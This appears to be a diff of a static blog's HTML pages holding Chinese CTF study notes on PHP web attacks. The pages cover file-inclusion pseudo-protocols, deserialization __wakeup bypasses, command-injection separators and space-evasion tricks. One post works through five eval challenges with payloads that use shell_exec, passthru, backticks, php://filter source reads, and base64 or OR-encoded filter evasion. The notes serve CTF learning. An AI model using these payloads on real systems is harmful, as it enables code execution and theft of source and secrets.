+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">echo</span>(<span class="built_in">file_get_contents</span>($a));<span class="comment">//获取文件内容</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<h2 id="反序列化分隔符"><a href="#反序列化分隔符" class="headerlink" title="反序列化分隔符"></a>反序列化分隔符</h2><p>反序列化以;}结束，后面的字符串不影响正常的反序列化</p>
-<h2 id="属性逃逸"><a href="#属性逃逸" class="headerlink" title="属性逃逸"></a>属性逃逸</h2><p>般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸</p>
-<p>‍</p>
+<p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
+<p>格式示例：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
+<p>格式示例：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>压缩及协议访问格式：</p>
+<p>压缩文件为.zip后缀<br>zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php<br>压缩文件为.bz2后缀<br>compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php<br>压缩文件为.gz后缀<br>compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php</p>
+<p>data:&#x2F;&#x2F;<br>data:&#x2F;&#x2F;伪协议可以通过请求提交的php代码数据配合文件包含函数可以达到代码执行效果。</p>
+<p>data:&#x2F;&#x2F;伪协议 成功执行前提<br>php.ini设置allow_url_include 与allow_url_open都为On。</p>
+<p>data:&#x2F;&#x2F;协议的格式是: data:&#x2F;&#x2F;数据流封装器,相应格式数据</p>
+<p>格式示例：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>phar:&#x2F;&#x2F;伪协议可以对zip格式压缩包进行访问解析</p>
+<p>格式示例：</p>
+<blockquote>
+<p>phar:&#x2F;&#x2F;绝对路径\phpinfo.zip\phpinfo.php</p>
+</blockquote>
+<p>注意这里与zip:&#x2F;&#x2F;不同的地方是，phar访问压缩包内容是通过&#x2F;访问，而zip是通过#访问</p>
+<blockquote>
+<p>使用这些伪协议时，需要注意PHP配置和服务器环境的限制，某些协议可能因为配置或安全原因被禁用。<br>特别是在处理外部资源（如HTTP或FTP）时，需要注意安全性，确保不会暴露敏感信息或遭受注入攻击。<br>在使用 data:&#x2F;&#x2F;、phar:&#x2F;&#x2F; 等伪协议时，应特别注意数据的验证和清洁，以避免安全漏洞。</p>
+</blockquote>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cmawal1j7001tbo7kaa35db1y" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cmawcfx9e002bcg7k4j621fpa" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -495,54 +378,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmawal1j7001ubo7kel1341m4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/命令注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h1 id="什么是命令注入"><a href="#什么是命令注入" class="headerlink" title="什么是命令注入"></a>什么是<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/16930730.html">命令注入</a></h1><p>‍</p>
-<h3 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h3><blockquote>
-<p>;     前面的执行完执行后面的<br>|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）<br>||    当前面的执行出错时（为假）执行后面的<br>&amp;     将任务置于后台执行<br>&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真<br>%0a  （换行）<br>%0d  （回车）</p>
-</blockquote>
-<p>‍</p>
-<h3 id="命令绕过空格方法有："><a href="#命令绕过空格方法有：" class="headerlink" title="命令绕过空格方法有："></a>命令绕过空格方法有：</h3><blockquote>
-<p>${IFS}$9<br>{IFS}<br>$IFS<br>${IFS}<br>$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行<br>IFS<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能，需要用{}括起来<br>%20   (space)<br>%09   (tab)<br>X&#x3D;$’cat\x09.&#x2F;flag.php’;$X       （\x09表示tab，也可以用\x20）</p>
-</blockquote>
-<blockquote>
-<p>ps:有时会禁用cat:<br>解决方法是使用tac反向输出命令：<br>linux命令中可以加\，所以甚至可以ca\t &#x2F;fl\ag</p>
-</blockquote>
-<p>‍</p>
-<p>‍</p>
-<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><blockquote>
-<p>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​</p>
-<p>$IFS在Linux下表示为空格<br>$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</p>
-<p>这里$IFS$9或$IFS垂直，后面加个$与{}类似，起截断作用</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" data-id="cmawal1j8001vbo7k9dxxcw54" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmawcfx9f002ccg7kaqok2ojw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -610,7 +446,61 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/" data-id="cmawal1j8001wbo7k485fe9ln" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/" data-id="cmawcfx9f002ecg7k022h3t59" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com"><a href="#魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com" class="headerlink" title="魔法方法php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)"></a>魔法方法<a target="_blank" rel="noopener" href="https://www.cnblogs.com/th0r/p/14071894.html#0x02-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95">php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)</a></h2><p>魔法方法指的是在php执行某个过程或函数时会调用的方法</p>
+<p>​<code>__construct()</code>​：在创建对象时候初始化对象，一般用于对变量赋初值（实例化对象时）。</p>
+<p>​<code>__destruct()</code>​： 和构造函数相反，当对象所在函数调用完毕后执行。（对象引用完成或对象被销毁反序列化之后）</p>
+<p>​<code>__toString()</code>​：当对象被当做一个字符串使用时调用。</p>
+<p>​<code>__invoke()</code>​：把对象当成函数调用</p>
+<p>​<code>__clone</code>​：当使用clone关键字拷贝完成一个对象</p>
+<p>​<code>__sleep()</code>​：序列化对象之前就调用此方法(其返回需要一个数组（序列化unserilize（）之前）</p>
+<p>​<code>__wakeup()</code>​：反序列化恢复对象之前调用该方法（反序列化unserilize（）之前）</p>
+<p>​<code>__call()</code>​：当调用对象中不存在的方法会自动调用该方法。  __callStatic():静态调用或调用成员常量时使用的方法不存在</p>
+<p>​<code>__get()</code>​：在调用私有属性（不存在）的时候会自动执行</p>
+<p>​<code>__set()</code>​：给不存在的成员属性赋值</p>
+<p>​<code>__isset()</code>​：在不可访问的属性上调用isset()或empty()触发</p>
+<p>​<code>__unset()</code>​：在不可访问的属性上使用unset()时触发</p>
+<h3 id="绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com"><a href="#绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com" class="headerlink" title="绕过 __wakeup​PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)"></a>绕过 <code>__wakeup</code>​<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14667?time__1311=mqmx9QDtDQ0QD=oDsdoYK0=9bkOQ=DcD3D&alichlgref=https://www.bing.com/">PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)</a></h3><p>当反序列化时, 给出的字段个数的数字小于提供的字段个数, 将不会执行 <code>__wakeup</code>​</p>
+<p>例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Dino&quot;:1:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Dino&quot;:114514:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="反序列化分隔符"><a href="#反序列化分隔符" class="headerlink" title="反序列化分隔符"></a>反序列化分隔符</h2><p>反序列化以;}结束，后面的字符串不影响正常的反序列化</p>
+<h2 id="属性逃逸"><a href="#属性逃逸" class="headerlink" title="属性逃逸"></a>属性逃逸</h2><p>般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cmawcfx9g002fcg7khzeqem46" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -646,7 +536,149 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%A5%9E%E5%A5%87%E7%9A%84MD5/" data-id="cmawal1j8001xbo7k4jcie4sa" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%A5%9E%E5%A5%87%E7%9A%84MD5/" data-id="cmawcfx9g002hcg7ka4la38ag" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/绕过/指令绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="指令绕过"><a href="#指令绕过" class="headerlink" title="指令绕过"></a>指令绕过</h1><h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>只要满足正则表达式中的，这串代码将进行eval($c)，eval这个函数会将字符串当作php代码执行</p>
+</blockquote>
+<blockquote>
+<p>方法一：?c&#x3D;system(‘cat config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法二：?c&#x3D;echo shell_exec(‘cat config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法三：?c&#x3D;highlight_file(‘config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法四：?c&#x3D;echo shell_exec(‘sed -n p config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法五：?c&#x3D;exec(‘cat config.php’, $output, $ret);echo ($output)[1];</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>由于正则表达式改为不匹配了!preg_match，那么我们将不能用这三个函数，还可以用passthru这个函数，这个可以直接输出在浏览器上?c&#x3D;passthru(‘cat config.php’);,还有一个比较神奇的php为什么直接输出flag?c&#x3D;echo $flag;</p>
+</blockquote>
+<blockquote>
+<p>方法一：</p>
+<p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。 因此可以构造linux命令输出config.php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `tac config.php`;</span><br></pre></td></tr></table></figure>
+
+<p>tac命令倒序输出文件，在页面就能看到结果flag。 如果用cat命令，正序输出，因为被认为是PHP文件，所以需要在F12网络请求里看响应。还可以用这个函数得到内容c&#x3D;echo file_get_contents(‘config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法二：php伪协议读取文件?c&#x3D;include(‘php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php’); 直接查看源码</p>
+<p>?c=show_source(‘config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法三：print_r();可以使用，?c=print_r(get_defined_vars()); 在数组中取出当前已定义的变量，本来是想传参到post绕过get的过滤机制system的，但是取出定义参数的时候，被定义好的flag参数也顺带被取出来了。</p>
+</blockquote>
+<blockquote>
+<p>方法四：拼接绕过，限制函数system，构造?c=$a=‘sys’;$b=‘tem’;$d=$a.$b;$d(‘cat config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法五：可以用get方式:?c=echo $_GET[1];&amp;1=tac config.php<br>可以用post方式:?c=echo $_POST[1];然后在Post data中写入1=tac config.php</p>
+</blockquote>
+<blockquote>
+<p>方法六：使用或运算模式绕过限制，F12查看源码?c&#x3D;(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%03%0f%0e%06%09%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%60%60%2e%60%60%60”);</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>不难看出，这一次仅用了cat命令，‘.’和php还有config，那么我们就要想办法绕过才行，符号*有猜测的作用</p>
+</blockquote>
+<blockquote>
+<p>可以用*符号来猜测补全不用完整的congfig和php，还有可以用tac不用cat就行，，system被禁用，老样子我们用passthru，还可以用print_r</p>
+</blockquote>
+<blockquote>
+<p>另类的解题方法 根据报错获得路径信息&#x2F;var&#x2F;www&#x2F;html c&#x3D;$a&#x3D;opendir(%27&#x2F;var&#x2F;www&#x2F;html%27);$e&#x3D;readdir($a);$e&#x3D;readdir($a);$e&#x3D;readdir($a);echo%20readfile($e);</p>
+</blockquote>
+<blockquote>
+<p>可以用base64编码来绕过c&#x3D;$a&#x3D;base64_decode(‘c3lzdGVt’);$b&#x3D;base64_decode(‘Y2F0IGNvbmZpZy5waHA&#x3D;’);$a($b);</p>
+</blockquote>
+<blockquote>
+<p>cat 还有 less more head tac tali</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>发现居然连分号都禁用了，php中?&gt;闭合了前面的<?，代表代码结束，因此最后一行是可以不需要分号的 ②?c=passthru('tac c*')?></p>
+</blockquote>
+<blockquote>
+<p>通过伪协议获取 题目已经明确告知答案在config.php payload: &#x2F;?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>发现这一次有点离谱，居然把小括号给引用了，那么有一些函数就用不了了，不过我们要记住php中&#96;&#96;直接代表指令</p>
+</blockquote>
+<blockquote>
+<p>那么我们就不用（）的函数，我们使用	?c&#x3D;echo `tac con*`?&gt;</p>
+</blockquote>
+<blockquote>
+<p>也可以直接echo找到flag</p>
+</blockquote>
+<blockquote>
+<p>当然还可以用伪协议</p>
+<p>涉及到一个php的代码结构，<?php $_GET[a];?>…..②payload为：?c&#x3D;include $_GET[a]?&gt;，等同于<?php include $_GET[a]?>，php的最后一行代码可以省去分号…..③include函数包含文件，且题目是对参数c正则过滤，因此GET型传参a可以绕过，从而执行我们的伪协议文件命令，读取config.php文件：php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;config.php④因此连起来构造的payload为：</p>
+</blockquote>
+<blockquote>
+<p>也可以&#x2F;?c&#x3D;echo <code>$_GET[a]</code>​?&gt;&amp;a&#x3D;cat config.php 让其echo一个get请求，?&gt;闭合，请求内容为cat config.php</p>
+</blockquote>
+<p>‍</p>
